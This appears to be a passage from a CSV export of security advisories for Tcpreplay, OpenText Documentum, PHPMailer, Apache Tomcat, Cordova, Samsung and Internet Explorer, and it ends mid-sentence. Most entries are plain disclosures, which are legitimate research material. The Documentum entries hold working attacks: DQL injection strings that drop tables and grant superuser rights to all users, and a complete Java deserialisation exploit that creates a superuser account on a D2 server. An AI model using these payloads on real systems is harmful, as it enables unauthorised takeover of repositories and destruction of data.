Tcpreplay 4.1.2 and possibly prior.
Fixed Version:
==============
4.2.0 Beta 1
Product Description:
====================
Tcpreplay is a suite of GPLv3 licensed utilities for UNIX (and Win32 under Cygwin) operating systems for editing and replaying network traffic which was previously captured by tools like tcpdump and Ethereal/Wireshark.
Vulnerability Type:
===================
Buffer Overflow
CVE Reference:
==============
CVE-2017-6429
Vulnerability Details:
======================
Tcpcapinfo utility of Tcpreplay have a buffer overflow vulnerability associated with parsing a crafted pcap file. This occurs in the src/tcpcapinfo.c file when capture has a packet that is too large to handle.
GDB Dump:
=========
---------Backtrace:-----------
/lib/x86_64-linux-gnu/libc.so.6(+0x7338f)[0x7ffff7a8838f]
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x5c)[0x7ffff7b1fc9c]
/lib/x86_64-linux-gnu/libc.so.6(+0x109b60)[0x7ffff7b1eb60]
/lib/x86_64-linux-gnu/libc.so.6(+0x109fed)[0x7ffff7b1efed]
/home/raras/Desktop/Untitled Folder/tcpreplay-4.1.2/src/tcpcapinfo[0x40228c]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf5)[0x7ffff7a36ec5]
/home/raras/Desktop/Untitled Folder/tcpreplay-4.1.2/src/tcpcapinfo[0x4028dc]
======= Memory map: ========
00400000-0041b000 r-xp 00000000 08:01 453864 /home/raras/Desktop/Untitled Folder/tcpreplay-4.1.2/src/tcpcapinfo
0061a000-0061b000 r--p 0001a000 08:01 453864 /home/raras/Desktop/Untitled Folder/tcpreplay-4.1.2/src/tcpcapinfo
0061b000-0061c000 rw-p 0001b000 08:01 453864 /home/raras/Desktop/Untitled Folder/tcpreplay-4.1.2/src/tcpcapinfo
0061c000-0063e000 rw-p 00000000 00:00 0 [heap]
7ffff77fe000-7ffff7814000 r-xp 00000000 08:01 660352 /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7814000-7ffff7a13000 ---p 00016000 08:01 660352 /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a13000-7ffff7a14000 r--p 00015000 08:01 660352 /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a14000-7ffff7a15000 rw-p 00016000 08:01 660352 /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a15000-7ffff7bd0000 r-xp 00000000 08:01 660238 /lib/x86_64-linux-gnu/libc-2.19.so
7ffff7bd0000-7ffff7dcf000 ---p 001bb000 08:01 660238 /lib/x86_64-linux-gnu/libc-2.19.so
7ffff7dcf000-7ffff7dd3000 r--p 001ba000 08:01 660238 /lib/x86_64-linux-gnu/libc-2.19.so
7ffff7dd3000-7ffff7dd5000 rw-p 001be000 08:01 660238 /lib/x86_64-linux-gnu/libc-2.19.so
7ffff7dd5000-7ffff7dda000 rw-p 00000000 00:00 0
7ffff7dda000-7ffff7dfd000 r-xp 00000000 08:01 660214 /lib/x86_64-linux-gnu/ld-2.19.so
7ffff7fd5000-7ffff7fd8000 rw-p 00000000 00:00 0
7ffff7ff4000-7ffff7ff8000 rw-p 00000000 00:00 0
7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0 [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0 [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:01 660214 /lib/x86_64-linux-gnu/ld-2.19.so
7ffff7ffd000-7ffff7ffe000 rw-p 00023000 08:01 660214 /lib/x86_64-linux-gnu/ld-2.19.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0 [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]
1 1260 134217964 575b56ff.0
Program received signal SIGABRT, Aborted.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x70 ('p')
RCX: 0xffffffffffffffff
RDX: 0x6
RSI: 0xcc0b
RDI: 0xcc0b
RBP: 0x7fffffffb500 --> 0x7ffff7b944c2 (""buffer overflow detected"")
RSP: 0x7fffffffb1e8 --> 0x7ffff7a4f0d8 (<__GI_abort+328>: mov rdx,QWORD PTR fs:0x10)
RIP: 0x7ffff7a4bcc9 (<__GI_raise+57>: cmp rax,0xfffffffffffff000)
R8 : 0x7ffff7b8bdc0 (""0123456789abcdefghijklmnopqrstuvwxyz"")
R9 : 0x61bd80 --> 0x7ffff7dd41c0 --> 0xfbad2086
R10: 0x8
R11: 0x246
R12: 0x7fffffffb370 --> 0x1
R13: 0x5
R14: 0x70 ('p')
R15: 0x5
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
0x7ffff7a4bcbf <__GI_raise+47>: movsxd rdi,ecx
0x7ffff7a4bcc2 <__GI_raise+50>: mov eax,0xea
0x7ffff7a4bcc7 <__GI_raise+55>: syscall
=> 0x7ffff7a4bcc9 <__GI_raise+57>: cmp rax,0xfffffffffffff000
0x7ffff7a4bccf <__GI_raise+63>: ja 0x7ffff7a4bcea <__GI_raise+90>
0x7ffff7a4bcd1 <__GI_raise+65>: repz ret
0x7ffff7a4bcd3 <__GI_raise+67>: nop DWORD PTR [rax+rax*1+0x0]
0x7ffff7a4bcd8 <__GI_raise+72>: test eax,eax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffb1e8 --> 0x7ffff7a4f0d8 (<__GI_abort+328>: mov rdx,QWORD PTR fs:0x10)
0008| 0x7fffffffb1f0 --> 0x20 (' ')
0016| 0x7fffffffb1f8 --> 0x0
0024| 0x7fffffffb200 --> 0x0
0032| 0x7fffffffb208 --> 0x0
0040| 0x7fffffffb210 --> 0x0
0048| 0x7fffffffb218 --> 0x0
0056| 0x7fffffffb220 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGABRT
0x00007ffff7a4bcc9 in __GI_raise (sig=sig@entry=0x6) at ../nptl/sysdeps/unix/sysv/linux/raise.c:56
56 ../nptl/sysdeps/unix/sysv/linux/raise.c: No such file or directory.
Patch:
======
src/tcpcapinfo.c
@@ -281,6 +281,15 @@ main(int argc, char *argv[])
caplen = pcap_ph.caplen;
}
+ if (caplentoobig) {
+ printf("" Capture file appears to be damaged or corrupt. ""
+ ""Contains packet of size %u, bigger than snap length %u "",
+ caplen, pcap_fh.snaplen);
+
+ close(fd);
+ break;
+ }
+
/* check to make sure timestamps don't go backwards */
if (last_sec > 0 && last_usec > 0) {
if ((pcap_ph.ts.tv_sec == last_sec) ?
@@ -306,7 +315,7 @@ main(int argc, char *argv[])
}
close(fd);
- continue;
+ break;
}
/* print the frame checksum */
References:
===========
https://github.com/appneta/tcpreplay/issues/278
https://github.com/appneta/tcpreplay/releases/tag/v4.2.0-beta1
Vulnerability Disclosure Timeline:
==================================
2017-02-08: Bug Report Submission & Coordination
2017-03-05: Public Disclosure
Credit:
=======
AromalUllas"
2064,CVE-2017-5585: SQL injection in OpenText Documentum Content Server 7.3 (PostgreSQL builds only),,CVE-2017-5585,"CVE Identifier: CVE-2017-5585
Vendor: OpenText
Affected products: OpenText Documentum Content Server 7.3 (PostgreSQL builds only)
Researcher: Andrey B. Panfilov
Severity Rating: CVSS v3 Base Score: 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
Fix: not available
Description:
Previously announced fix for CVE-2014-2520 seems to be incomplete: when PostgreSQL Database is used and return_top_results_row_based config option is set to false, Content Server does not properly restrict DQL hints, which allows remote authenticated users to conduct DQL injection attacks and execute arbitrary DML/DDL statements on the target system via crafted request.
Demonstration:
================================================================8<==============================================================
Connecting to Server using docbase DCTM_PSQL
[DM_SESSION_I_SESSION_START]info: ""Session 0102987880002902 started for user dm_bof_registry.""
Connected to Documentum Server running Release 7.3.0000.0214 Linux64.Postgres
--
-- Amount of superusers in Documentum repository
--
1> select count(*) from dm_user where user_privileges=16
2> go
count
------------
1
(1 row affected)
--
-- Demonstration or how Content Server translates DQL query to SQL
--
1> select count(*) from dm_user ENABLE (RETURN_RANGE 1 10 '1;drop table dm_user_s;')
2> go
[DM_QUERY_E_CURSOR_ERROR]error:
""A database error has occurred during the creation of a cursor
(' STATE=2BP01, CODE=7, MSG=ERROR: cannot drop table dm_user_s because other objects depend on it;
Error while executing the query').""
1> exec get_last_sql
2> go
result
-------------------------------------------------------------------------------------------
select all CAST(count(*) as int) from dm_user_sp dm_user order by 1;drop table dm_user_s; 1321 Commit 1321 Commit
(1 row affected)
--
-- Exploitation
--
1> select count(*) from dm_user ENABLE (RETURN_RANGE 1 10 '1;update dm_user_s set user_privileges=16;')
2> go
count
------------
67
(1 row affected)
--
-- Amount of superusers in Documentum repository after exploitation
--
1> select count(*) from dm_user where user_privileges=16
2> go
count
------------
67
(1 row affected)
1>
================================================================>8==============================================================
Disclosure timeline:
2014.02.22: Vulnerability discovered
2017.01.25: CVE Identifier assigned
2017.02.01: Vendor contacted, no response
2017.02.15: Public disclosure
__
Regards,
Andrey B. Panfilov"
2066,CVE-2017-5586: Remote code execution in OpenText Documentum D2,,CVE-2017-5586,"CVE Identifier: CVE-2017-5586
Vendor: OpenText
Affected products: Documentum D2 version 4.x
Researcher: Andrey B. Panfilov
Severity Rating: CVSS v3 Base Score: 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
Description: Document D2 contains vulnerable BeanShell (bsh) and Apache Commons libraries and accepts serialised data from untrusted sources, which leads to remote code execution
Proof of concept:
===================================8<===========================================
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.PriorityQueue;
import bsh.Interpreter;
import bsh.XThis;
import com.documentum.fc.client.content.impl.ContentStoreResult;
import com.documentum.fc.client.impl.typeddata.TypedData;
/**
* @author Andrey B. Panfilov <andrey panfilov tel>
*
* Code below creates superuser account in underlying Documentum repository
* usage: java DocumentumD2BeanShellPoc http://host:port/D2 <docbase_name> <user_name_to_create>
*
*/
@SuppressWarnings(""unchecked"")
public class DocumentumD2BeanShellPoc {
public static void main(String[] args) throws Exception {
String url = args[0];
String docbase = args[1];
String userName = args[2];
String payload = ""compare(Object foo, Object bar) {new Interpreter()""
+ "".eval(""try{com.documentum.fc.client.IDfSession session = com.documentum.fc.impl.RuntimeContext.getInstance()""
+ "".getSessionRegistry().getAllSessions().iterator().next();""
+ ""session=com.emc.d2.api.D2Session.getAdminSession(session, false);""
+ ""com.documentum.fc.client.IDfQuery query = new com.documentum.fc.client.DfQuery(""
+ ""\""CREATE dm_user object set user_name='%s',set user_login_name='%s',set user_source='inline password', ""
+ ""set user_password='%s', set user_privileges=16\"");query.execute(session, 3);} ""
+ ""catch (Exception e) {}; return 0;"");}"";
Interpreter interpreter = new Interpreter();
interpreter.eval(String.format(payload, userName, userName, userName));
XThis x = new XThis(interpreter.getNameSpace(), interpreter);
Comparator comparator = (Comparator) x.getInterface(new Class[] { Comparator.class, });
PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
Object[] queue = new Object[] { 1, 1 };
setFieldValue(priorityQueue, ""queue"", queue);
setFieldValue(priorityQueue, ""size"", 2);
// actually we may send priorityQueue directly, but I want to hide
// deserialization stuff from stacktrace :)
Class cls = Class.forName(""com.documentum.fc.client.impl.typeddata.ValueHolder"");
Constructor ctor = cls.getConstructor();
ctor.setAccessible(true);
Object valueHolder = ctor.newInstance();
setFieldValue(valueHolder, ""m_value"", priorityQueue);
List valueHolders = new ArrayList();
valueHolders.add(valueHolder);
TypedData data = new TypedData();
setFieldValue(data, ""m_valueHolders"", valueHolders);
ContentStoreResult result = new ContentStoreResult();
setFieldValue(result, ""m_attrs"", data);
ByteArrayOutputStream baos = new ByteArrayOutputStream();
DataOutputStream dos = new DataOutputStream(baos);
for (Character c : ""SAVED"".toCharArray()) {
dos.write(c);
}
dos.write((byte) 124);
dos.flush();
ObjectOutputStream oos = new ObjectOutputStream(baos);
oos.writeObject(result);
oos.flush();
byte[] bytes = baos.toByteArray();
baos = new ByteArrayOutputStream();
dos = new DataOutputStream(baos);
dos.writeInt(bytes.length);
dos.write(bytes);
dos.flush();
HttpURLConnection conn = (HttpURLConnection) new URL(makeUrl(url)).openConnection();
conn.setRequestProperty(""Content-Type"", ""application/octet-stream"");
conn.setRequestMethod(""POST"");
conn.setUseCaches(false);
conn.setDoOutput(true);
conn.getOutputStream().write(baos.toByteArray());
conn.connect();
System.out.println(""Response code: "" + conn.getResponseCode());
InputStream stream = conn.getInputStream();
byte[] buff = new byte[1024];
int count = 0;
while ((count = stream.read(buff)) != -1) {
System.out.write(buff, 0, count);
}
}
public static String makeUrl(String url) {
if (!url.endsWith(""/"")) {
url += ""/"";
}
return url + ""servlet/DoOperation?origD2BocsServletName=Checkin&id=1&file=/etc/passwd&file_length=1000""
+ ""&_username=dmc_wdk_preferences_owner&_password=webtop"";
}
public static Field getField(final Class<?> clazz, final String fieldName) throws Exception {
Field field = clazz.getDeclaredField(fieldName);
if (field == null && clazz.getSuperclass() != null) {
field = getField(clazz.getSuperclass(), fieldName);
}
field.setAccessible(true);
return field;
}
public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
final Field field = getField(obj.getClass(), fieldName);
field.set(obj, value);
}
}
===================================>8===========================================
Disclosure timeline:
2016.02.28: Vulnerability discovered
2017.01.25: CVE Identifier assigned
2017.02.01: Vendor contacted, no response
2017.02.15: Public disclosure
__
Regards,
Andrey B. Panfilov"
2113,CVE-2017-3160: Gradle Distribution URL used by Cordova-Android does not use https by default,,CVE-2017-3160,"===================================================================
CVE-2017-3160: Gradle Distribution URL used by Cordova-Android does not use https by default
Severity: High
Vendor: The Apache Software Foundation
Versions Affected: Cordova Android (6.1.1 and below)
Description: After the Android platform is added to Cordova the first time, or after a project is created using the build scripts, the scripts will fetch Gradle on the first build. However, since the default URI is not using https, it is vulnerable to a MiTM and the Gradle executable is not safe. The severity of this issue is high due to the fact that the build scripts immediately start a build after Gradle has been fetched.
Upgrade path: Developers who are concerned about this issue should install version 6.1.2 or higher of Cordova-Android.
Mitigation Steps: If developers are unable to install the latest version, this vulnerability can easily be mitigated by setting the CORDOVA_ANDROID_GRADLE_DISTRIBUTION_URL environment variable to https://services.gradle.org/distributions/gradle-2.14.1-all.zip
Credit: Alon Galili"
2155,Novel Contributions to the Field - How I broke MySQL's codebase (Part 2) [CVE-2016-5541] MySQL Cluster 0day,,CVE-2016-5541,"**************************************************
(c) 2017 Advanced Information Security Corporation and Oracle Inc.
**************************************************
Author: Nicholas Lemonias
Date: 17/01/2017
MySQL Remote 0day / Remote Buffer Overflows in 'NDBAPI' Cluster
Full report with technical details can be obtained from:
https://www.docdroid.net/hwLnQVr/cve-2016-5541.pdf.html
(References)
[1] Oracle Critical Patch Update - January 2017. 2017. Oracle Critical Patch Update - January 2017.
[ONLINE] Available at: http://www.oracle.com/technetwork/security-advisory/cpujan2017-2881727.html"
2168,CVE-2017-5350: Unexpected SystemUI FC driven by arbitrary application,,CVE-2017-5350,"Description of the potential vulnerability:Lack of appropriate exception handling in some applications allows attackers to make a systemUI crash easily resulting in a possible DoS attack
Affected versions: L(5.0/5.1), M(6.0), and N(7.0)
Disclosure status: Privately disclosed.
The patch prevents systemUI crashes by handling unexpected exceptions.
Fix:
http://security.samsungmobile.com/smrupdate.html#SMR-JAN-2017
SVE-2016-7122: Unexpected SystemUI FC driven by arbitrary application
Sincerely,
Ant-financial Light-Year Security Lab"
2187,[SECURITY][UPDATE] CVE-2016-8745 Apache Tomcat Information Disclosure,,CVE-2016-8745,"CVE-2016-8745 Apache Tomcat Information Disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache Tomcat 9.0.0.M1 to 9.0.0.M13
Apache Tomcat 8.5.0 to 8.5.8
Apache Tomcat 8.0.0.RC1 to 8.0.39 (new)
Apache Tomcat 7.0.0 to 7.0.73 (new)
Apache Tomcat 6.0.16 to 6.0.48 (new)
Description
A bug in the error handling of the send file code for the NIO HTTP
connector resulted in the current Processor object being added to the
Processor cache multiple times. This in turn meant that the same
Processor could be used for concurrent requests. Sharing a Processor can
result in information leakage between requests including, not not
limited to, session ID and the response body.
The bug was first noticed in 8.5.x onwards where it appears the
refactoring of the Connector code for 8.5.x onwards made it more likely
that the bug was observed. Initially it was thought that the 8.5.x
refactoring introduced the bug but further investigation has shown that
the bug is present in all currently supported Tomcat versions.
Mitigation:
Users of the NIO HTTP connector with the affected versions should apply
one of the following mitigations
- Switch to the BIO HTTP, NIO2 HTTP or APR HTTP connector
- Disable send file
- Upgrade to Apache Tomcat 9.0.0.M15 or later
(Apache Tomcat 9.0.0.M14 has the fix but was not released)
- Upgrade to Apache Tomcat 8.5.9 or later
- Upgrade to Apache Tomcat 8.0.40 or later when released
- Upgrade to Apache Tomcat 7.0.74 or later when released
- Upgrade to Apache Tomcat 6.0.49 or later when released
Credit:
This issue was reported publicly as Bug 60409 [1] and the security
implications identified by the Tomcat security team.
History:
2016-12-12 Original advisory
2017-01-04 Updated information on affected versions
References:
[1] https://bz.apache.org/bugzilla/show_bug.cgi?id=60409
[2] http://tomcat.apache.org/security-9.html
[3] http://tomcat.apache.org/security-8.html
[3] http://tomcat.apache.org/security-7.html
[3] http://tomcat.apache.org/security-6.html"
2196,PHPMailer < 5.2.20 Remote Code Execution PoC 0day Exploit (CVE-2016-10045) (Bypass of the CVE-2016-1033 patch),,CVE-2016-10045,"PHPMailer < 5.2.20 Remote Code Execution PoC 0day Exploit
(CVE-2016-10045) (Bypass of the CVE-2016-1033 patch)
Discovered by Dawid Golunski (@dawid_golunski)
https://legalhackers.com
Desc:
I discovered that the current PHPMailer versions (< 5.2.20) were still
vulnerable to RCE as it is possible to bypass the currently available
patch.
This was reported responsibly to the vendor & assigned a CVEID on the
26th of December.
The vendor has been working on a new patch which would fix the problem but
not break the RFC too badly. The patch should be published very soon.
I'm releasing this as a 0day without the new patch available publicly
as a potential bypass was publicly discussed on oss-sec list with Solar
Designer in the PHPMailer < 5.2.18 thread, so holding the advisory
further would serve no purpose.
Current advisory URL:
https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html
PoC exploit URL:
https://legalhackers.com/exploits/CVE-2016-10045/PHPMailer_RCE_exploit.pl
More updates soon at:
https://twitter.com/dawid_golunski
Stay tuned ;)
--
Regards,
Dawid Golunski
https://legalhackers.com
t: @dawid_golunski"
2204,CVE-2014-4138: MSIE 11 MSHTML CPaste­Command::Convert­Bitmapto­Png heap-based buffer overflow,,CVE-2014-4138,"Since November I have been releasing details on all vulnerabilities I
found that I have not released before. This is the 37th entry in the
series. This information is available in more detail on my blog at
http://blog.skylined.nl/20161221001.html. There you can find a repro
that triggered this issue in addition to the information below, as well
as a Proof-of-Concept exploit that attempts to prove exploitability.
If you find these releases useful, and would like to help me make time
to continue releasing this kind of information, you can make a donation
in bitcoin to 183yyxa9s1s1f7JBp­PHPmz­Q346y91Rx5DX.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
MSIE 11 MSHTML CPasteCommand::ConvertBitmaptoPng heap-based BOF
===============================================================
(MS14-056, CVE-2014-4138)
Synopsis
--------
A specially crafted web-page can trigger an out-of-bounds write in
Microsoft Internet Explorer 11. Code that handles pasting images from
the clipboard uses an incorrect buffer length, which allows writing
beyond the boundaries of a heap-based buffer. An attacker able to
trigger this vulnerability can execute arbitrary code.
Known affected software, attack vectors and potential mitigations
-----------------------------------------------------------------
* **Microsoft Internet Explorer 11.0.9600.16521**
An attacker would need to get a target user to open a specially
crafted web-page. In order to trigger the issue, the web-page needs
to either programmatically copy/paste an image using Javascript or
get the user to do this (for instance by tricking the user into
typing keyboard shortcuts such as CTRL+C/CTRL+V) . By default, MSIE
prompts the user to allow or disallow programmatically copy/pasting
the first time a website tries to do this, so user-interaction is
normally required in such cases. Disabling the `Allow Programmatic
clipboard access` setting in `Internet Options` -> `Security
Settings` -> [Choose a zone] -> `Scripting` should prevent websites
from programmatically copy/pasting an image. Disabling execution of
scripts on web-pages altogether will have the same effect. Please
note that neither option prevents a website from social engineering
the user into typing a keyboard shortcut to copy/paste the image.
Details
-------
When an image is pasted in MSHTML, it gets converted from BMP format to
PNG. This is done in the `MSHTML!CPasteCommand::ConvertBitmaptoPng`
function. This function incorrectly uses the size of the original BMP
image to allocate memory for storing the converted PNG image. The PNG
image will be smaller than the BMP under most circumstances, but if a
specially crafted image leads to the original BMP image being smaller
than the converted PNG, the function will write PNG data beyond the
bounds of the allocated memory.
Exploit
-------
An attacker looking to exploit this issue will commonly attempt to get
the memory allocated to store the PNG image in a location that is
followed by a pre-allocated memory block that contains information the
attacker would like to modify. Using the buffer overflow, the attacker
can overwrite this pre-allocated memory block with attacker controlled
data. Depending on the type of the pre-allocated memory, this could
allow the attacker to read or modify arbitrary information within the
process and take control of execution flow. No attempt was made to
create a Proof-of-Concept that shows this level of control.
Time-line
---------
* 8 May 2014: This vulnerability was submitted to ZDI.
* 9 June 2014: This vulnerability was acquired by ZDI.
* 23 June 2014: This vulnerability was disclosed to Microsoft by ZDI.
* 14 October 2014: This vulnerability was address by Microsoft in
MS14-056.
* 21 December 2016: Details of this vulnerability are released.
Cheers,
SkyLined"
2208,CVE-2014-1785: MSIE 11 MSHTML CSpliceTreeEngine::RemoveSplice use-after-free,,CVE-2014-1785,"Since November I have been releasing details on all vulnerabilities I
found that I have not released before. This is the 36th entry in the
series. This information is available in more detail on my blog at
http://blog.skylined.nl/20161220001.html. There you can find a repro
that triggered this issue in addition to the information below, as well
as a Proof-of-Concept exploit that attempts to prove exploitability.
If you find these releases useful, and would like to help me make time
to continue releasing this kind of information, you can make a donation
in bitcoin to 183yyxa9s1s1f7JBp­PHPmz­Q346y91Rx5DX.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
MSIE 11 MSHTML CSpliceTreeEngine::RemoveSplice use-after-free
=============================================================
(MS14-035, CVE-2014-1785)
Synopsis
--------
A specially crafted web-page can trigger a use-after-free vulnerability
in Microsoft Internet Explorer 11. There is sufficient time between the
free and reuse for an attacker to control the contents of the freed
memory and exploit the vulnerability.
Known affected software, attack vectors and potential mitigations
-----------------------------------------------------------------
* Microsoft Internet Explorer 11
An attacker would need to get a target user to open a specially
crafted web-page. Disabling JavaScript should prevent an attacker
from triggering the vulnerable code path.
Details
-------
This was one of the first bugs where I attempted to do a proper
analysis, and I got some feedback from ZDI that explained what I got
right and what I got wrong. Basically, on x86, a 0x28 byte memory block
is allocated in `MSHTML!CMarkup::DoEmbedPointers` and when you execute
`document.execCommand(""Delete"")`. This memory can be freed when you
execute `document.open()` in a `DOMNodeRemoved` event handler. After
that, you can use Javascript to reallocate the memory before it is reused.
Time-line
---------
* 30 December 2013: This vulnerability was submitted to ZDI.
* 8 January 2014: This vulnerability was acquired by ZDI.
* 14 January 2014: This vulnerability was disclosed to Microsoft by ZDI.
* 10 June 2014: This vulnerability was address by Microsoft in MS14-035.
* 20 December 2016: Details of this vulnerability are released.
Cheers,
SkyLined"
2213,"CVE-2016-9277,CVE-2016-9966,CVE-2016-9967: Possible Privilege Escalation in telecom",,CVE-2016-9277,"Description of the potential vulnerability:Lack of appropriate exception handling in some receivers of the Telecom application allows attackers crash the system easily resulting in a possible DoS attack
Affected versions: L(5.0/5.1), M(6.0)
Disclosure status: Privately disclosed.
The patch prevents system crashes by handling unexpected exceptions.
Fix:
http://security.samsungmobile.com/smrupdate.html#SMR-DEC-2016
SVE-2016-7119, SVE-2016-7120, and SVE-2016-7121: Possible Privilege Escalation in telecom
Sincerely,
Ant-financial Light-Year Security Lab"
2214,CVE-2013-0090: MSIE 9 IEFRAME CView::EnsureSize use-after-free,,CVE-2013-0090,"Since November I have been releasing details on all vulnerabilities I
found that I have not released before. This is the 34th entry in the
series. This information is available in more detail on my blog at
http://blog.skylined.nl/20161216001.html. There you can find a repro
that triggered this issue in addition to the information below.
If you find these releases useful, and would like to help me make time
to continue releasing this kind of information, you can make a donation
in bitcoin to 183yyxa9s1s1f7JBp­PHPmz­Q346y91Rx5DX.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
MSIE 9 IEFRAME CView::EnsureSize use-after-free
===============================================
(MS13-021, CVE-2013-0090)
Synopsis
--------
A specially crafted web-page can trigger a use-after-free vulnerability
in Microsoft Internet Explorer 9. I did not investigate this
vulnerability thoroughly, so I cannot speculate on the potential impact
or exploitability.
Known affected software and attack vectors
------------------------------------------
* Microsoft Internet Explorer 9
An attacker would need to get a target user to open a specially
crafted web-page. Disabling JavaScript should prevent an attacker
from triggering the vulnerable code path.
Details
-------
This bug was found back when I had very little knowledge and tools to do
analysis on use-after-free bugs, so I have no details to share. ZDI
revealed that this was a use-after-free vulnerability in their advisory
at http://www.zerodayinitiative.com/advisories/ZDI-13-097/.
Time-line
---------
* Sometime in October 2012: This vulnerability was found through
fuzzing.
* 29 October 2012: This vulnerability was submitted to EIP.
* 27 November 2013: This vulnerability was rejected by EIP.
* 14 January 2013: This vulnerability was submitted to ZDI.
* 6 February 2013: This vulnerability was acquired by ZDI.
* 13 February 2013: This vulnerability was disclosed to Microsoft by
ZDI.
* 29 May 2013: This vulnerability was address by Microsoft in MS13-021.
* 14 December 2016: Details of this vulnerability are released.
Cheers,
SkyLined"
2218,CVE-2013-3143: MSIE 9 IEFRAME CMarkup..Remove­Pointer­Pos use-after-free,,CVE-2013-3143,"Since November I have been releasing details on all vulnerabilities I
found that I have not released before. This is the 32nd entry in the
series. This information is available in more detail on my blog at
http://blog.skylined.nl/20161214001.html. There you can find a repro
that triggered this issue in addition to the information below.
If you find these releases useful, and would like to help me make time
to continue releasing this kind of information, you can make a donation
in bitcoin to 183yyxa9s1s1f7JBp­PHPmz­Q346y91Rx5DX.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
MSIE 9 IEFRAME CMarkup..RemovePointerPos use-after-free
=======================================================
(MS13-055, CVE-2013-3143)
Synopsis
--------
A specially crafted web-page can trigger a use-after-free vulnerability
in Microsoft Internet Explorer 9. I did not investigate this
vulnerability thoroughly, so I cannot speculate on the potential impact
or exploitability.
Known affected software and attack vectors
------------------------------------------
* **Microsoft Internet Explorer 9**
An attacker would need to get a target user to open a specially
crafted web-page. Disabling JavaScript should prevent an attacker
from triggering the vulnerable code path.
Details
-------
This bug was found back when I had very little knowledge and tools to do
analysis on use-after-free bugs, so I have no details to share. ZDI
revealed that this was a use-after-free vulnerability, though their
advisory (at http://www.zerodayinitiative.com/advisories/ZDI-13-163/)
mentions an iframe, which is not in the repro I provided.
Time-line
---------
* Sometime in November 2012: This vulnerability was found through fuzzing.
* 11 November 2012: This vulnerability was submitted to EIP.
* 10 December 2012: This vulnerability was rejected by EIP.
* 12 December 2012: This vulnerability was submitted to ZDI.
* 25 January 2013: This vulnerability was acquired by ZDI.
* 15 February 2013: This vulnerability was disclosed to Microsoft by
ZDI.
* 26 July 2013: This vulnerability was address by Microsoft in MS13-055.
* 14 December 2016: Details of this vulnerability are released.
Cheers,
SkyLined"
2232,[SECURITY] CVE-2016-8745 Apache Tomcat Information Disclosure,,CVE-2016-8745,"CVE-2016-8745 Apache Tomcat Information Disclosure
Severity: Important
Vendor: The Apache Software Foundation
Versions Affected:
Apache Tomcat 9.0.0.M1 to 9.0.0.M13
Apache Tomcat 8.5.0 to 8.5.8
Earlier versions are not affected.
Description
The refactoring of the Connector code for 8.5.x onwards introduced a
regression in the error handling of the send file code for the NIO HTTP
connector. An error during send file processing resulted in the current
Processor object being added to the Processor cache multiple times. This
in turn meant that the same Processor could be used for concurrent
requests. Sharing a Processor can result in information leakage between
requests including, not not limited to, session ID and the response body.
Mitigation
Users of the NIO HTTP connector with the affected versions should apply
one of the following mitigations
- Switch to the NIO2 HTTP or APR HTTP connector
- Disable send file
- Upgrade to Apache Tomcat 9.0.0.M15 or later
(Apache Tomcat 9.0.0.M14 has the fix but was not released)
- Upgrade to Apache Tomcat 8.5.9 or later
Credit:
This issue was reported publicly as Bug 60409 [1] and the security
implications identified by the Tomcat security team.
References:
[1] https://bz.apache.org/bugzilla/show_bug.cgi?id=60409
[2] http://tomcat.apache.org/security-9.html
[3] http://tomcat.apache.org/security-8.html"
2238,CVE-2013-1306: MSIE 9 MSHTML CDisp­Node::Insert­Sibling­Node use-after-free details,,CVE-2013-1306,"Since November I have been releasing details on all vulnerabilities I
found that I have not released before. This is the twenty-eighth entry
in the series. This information is available in more detail on my blog
at http://blog.skylined.nl/20161208001.html. There you can find a repro
that triggered this issue in addition to the information below.
Today's release is again not very interesting, because it also was one
of the first bugs I found and reported back in 2012, before I had
developed the tools and skills to properly analyze MSIE bugs. This
report is therefore very scarce in information. I did get some more
details from EIP about the root cause, which I've included.
If you find this information useful, and would like to help me make time
to continue releasing this kind of information, you can make a donation
in bitcoin to 183yyxa9s1s1f7JBp­PHPmz­Q346y91Rx5DX.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
MSIE 9 MSHTML CDispNode::InsertSiblingNode use-after-free
=========================================================
(MS13-037, CVE-2013-1306)
Synopsis
--------
A specially crafted web-page can trigger a memory corruption
vulnerability in Microsoft Internet Explorer 9. I did not investigate
this vulnerability thoroughly, so I cannot speculate on the potential
impact or exploitability.
Known affected software and attack vectors
------------------------------------------
* Microsoft Internet Explorer 9
An attacker would need to get a target user to open a specially
crafted web-page. JavaScript does not appear to be required for an
attacker to triggering the vulnerable code path.
Details
-------
This bug was found back when I had very little knowledge and tools to do
analysis on use-after-free bugs, so I have no details to share. The EIP
provided me with some details of their analysis, which I'll paraphrase
